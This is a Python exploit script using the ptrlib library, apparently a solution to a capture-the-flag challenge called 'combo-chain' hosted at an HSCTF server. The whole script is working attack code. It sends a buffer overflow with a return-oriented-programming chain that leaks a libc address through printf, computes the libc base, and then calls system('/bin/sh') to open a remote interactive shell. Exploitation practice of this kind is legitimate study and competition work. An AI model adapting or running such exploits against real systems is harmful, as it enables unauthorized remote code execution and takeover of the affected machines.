from ptrlib import *

elf = ELF("./combo-chain")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("./combo-chain")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
sock = Socket("pwn.hsctf.com", 2345)

plt_printf = 0x401050
rop_ret = 0x0040101a
rop_pop_rdi = 0x00401263

# leak
payload = b'A' * 0x10
payload += p64(rop_ret) # align
payload += p64(rop_pop_rdi)
payload += p64(elf.got("gets"))
payload += p64(plt_printf)
payload += p64(elf.symbol("_start"))
sock.recvuntil(": ")
sock.sendline(payload)
addr_gets = u64(sock.recv(6))
logger.info("gets = " + hex(addr_gets))
libc_base = addr_gets - libc.symbol("gets")
logger.info("libc base = " + hex(libc_base))

# get the shell!
payload = b'A' * 0x10
payload += p64(rop_ret) # align
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.recvuntil(": ")
sock.sendline(payload)

sock.interactive()
